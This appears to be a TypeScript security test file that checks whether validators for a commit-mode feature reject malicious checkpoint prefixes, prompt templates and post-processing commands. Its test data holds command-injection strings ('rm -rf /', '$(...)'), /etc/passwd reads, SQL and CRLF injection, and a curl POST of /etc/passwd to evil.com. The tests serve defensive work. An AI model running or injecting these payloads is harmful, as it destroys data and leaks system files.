/**
 * Security tests for commit mode functionality
 * Tests various malicious inputs to ensure they are properly blocked
 */

import {
  validateCommitModeSettings,
  validateCheckpointPrefix,
  validateStructuredPromptTemplate,
  validateFinalizeSessionOptions,
  sanitizeCommitModeSettings,
} from '../utils/commitModeValidation';
import { CommitModeSettings, FinalizeSessionOptions } from '../../../shared/types';

/**
 * Test malicious checkpoint prefixes
 */
function testMaliciousCheckpointPrefixes() {
  console.log('\n=== Testing Malicious Checkpoint Prefixes ===');
  
  const maliciousPrefixes = [
    '"; rm -rf /; echo "',  // Command injection
    '`$(rm -rf /)`',        // Command substitution
    'prefix; cat /etc/passwd; echo "', // Command chaining
    'prefix && rm -rf *',   // Command chaining
    'prefix | curl evil.com', // Pipe to malicious command
    'prefix\n$(evil_command)', // Newline injection
    'prefix\r\nrm -rf /',   // CRLF injection
    "''; DROP TABLE sessions; --", // SQL injection attempt
    'prefix\x00evil',       // Null byte injection
    'a'.repeat(200),        // Buffer overflow attempt
  ];

  for (const prefix of maliciousPrefixes) {
    const result = validateCheckpointPrefix(prefix);
    if (result.isValid) {
      console.error(`❌ SECURITY ISSUE: Malicious prefix passed validation: "${prefix}"`);
    } else {
      console.log(`✅ Blocked malicious prefix: "${prefix.substring(0, 20)}..."`);
    }
  }
}

/**
 * Test malicious structured prompt templates
 */
function testMaliciousPromptTemplates() {
  console.log('\n=== Testing Malicious Prompt Templates ===');
  
  const maliciousTemplates = [
    '$(rm -rf /)',          // Command substitution
    '`cat /etc/passwd`',    // Command substitution backticks
    'template; rm -rf *',   // Command chaining
    'template && evil_cmd', // Command chaining
    'template || evil_cmd', // Command chaining
    'template | curl evil.com', // Pipe to malicious command
    'a'.repeat(6000),       // Excessive length
  ];

  for (const template of maliciousTemplates) {
    const result = validateStructuredPromptTemplate(template);
    if (result.isValid) {
      console.error(`❌ SECURITY ISSUE: Malicious template passed validation: "${template.substring(0, 30)}..."`);
    } else {
      console.log(`✅ Blocked malicious template: "${template.substring(0, 30)}..."`);
    }
  }
}

/**
 * Test malicious finalize session options
 */
function testMaliciousFinalizationOptions() {
  console.log('\n=== Testing Malicious Finalize Options ===');
  
  const maliciousOptions: FinalizeSessionOptions[] = [
    {
      postProcessingCommands: ['rm -rf /'],
    },
    {
      postProcessingCommands: ['curl -X POST evil.com --data-binary @/etc/passwd'],
    },
    {
      postProcessingCommands: ['sudo rm -rf /'],
    },
    {
      postProcessingCommands: ['../../../etc/passwd'],
    },
    {
      postProcessingCommands: ['npm run evil-script'],
    },
    {
      postProcessingCommands: ['git add .'], // Git commands not allowed
    },
    {
      postProcessingCommands: ['echo "safe command"'], // Echo commands not allowed  
    },
    {
      commitMessage: 'a'.repeat(1000), // Excessive length
    },
  ];

  for (const options of maliciousOptions) {
    const result = validateFinalizeSessionOptions(options);
    if (result.isValid) {
      console.error(`❌ SECURITY ISSUE: Malicious options passed validation:`, options);
    } else {
      console.log(`✅ Blocked malicious options: ${result.errors[0]}`);
    }
  }
}

/**
 * Test commit mode settings validation
 */
function testMaliciousCommitModeSettings() {
  console.log('\n=== Testing Malicious Commit Mode Settings ===');
  
  const maliciousSettings: CommitModeSettings[] = [
    {
      mode: 'evil' as any, // Invalid mode
    },
    {
      mode: 'checkpoint',
      checkpointPrefix: '"; rm -rf /; echo "',
    },
    {
      mode: 'structured',
      structuredPromptTemplate: '$(rm -rf /)',
    },
    {
      mode: 'checkpoint',
      checkpointPrefix: 'a'.repeat(200),
    },
  ];

  for (const settings of maliciousSettings) {
    const result = validateCommitModeSettings(settings);
    if (result.isValid) {
      console.error(`❌ SECURITY ISSUE: Malicious settings passed validation:`, settings);
    } else {
      console.log(`✅ Blocked malicious settings: ${result.errors[0]}`);
    }
  }
}

/**
 * Test sanitization functionality
 */
function testSanitization() {
  console.log('\n=== Testing Sanitization ===');
  
  const maliciousSettings = {
    mode: 'checkpoint',
    checkpointPrefix: '"; rm -rf /; echo "',
    structuredPromptTemplate: '$(evil_command)',
    allowClaudeTools: true,
    extraMaliciousField: 'should be removed',
  };

  const sanitized = sanitizeCommitModeSettings(maliciousSettings);
  
  if (sanitized.checkpointPrefix === maliciousSettings.checkpointPrefix) {
    console.error('❌ SECURITY ISSUE: Malicious prefix not sanitized');
  } else {
    console.log('✅ Malicious prefix was sanitized');
  }

  if (sanitized.structuredPromptTemplate === maliciousSettings.structuredPromptTemplate) {
    console.error('❌ SECURITY ISSUE: Malicious template not sanitized');
  } else {
    console.log('✅ Malicious template was sanitized');
  }

  if ((sanitized as any).extraMaliciousField) {
    console.error('❌ SECURITY ISSUE: Extra malicious field not removed');
  } else {
    console.log('✅ Extra fields were removed');
  }
}

/**
 * Run all security tests
 */
export function runSecurityTests() {
  console.log('🔒 Running Security Tests for Commit Mode Functionality');
  
  testMaliciousCheckpointPrefixes();
  testMaliciousPromptTemplates();
  testMaliciousFinalizationOptions();
  testMaliciousCommitModeSettings();
  testSanitization();
  
  console.log('\n✅ Security tests completed');
}

// Run tests if this file is executed directly
if (require.main === module) {
  runSecurityTests();
}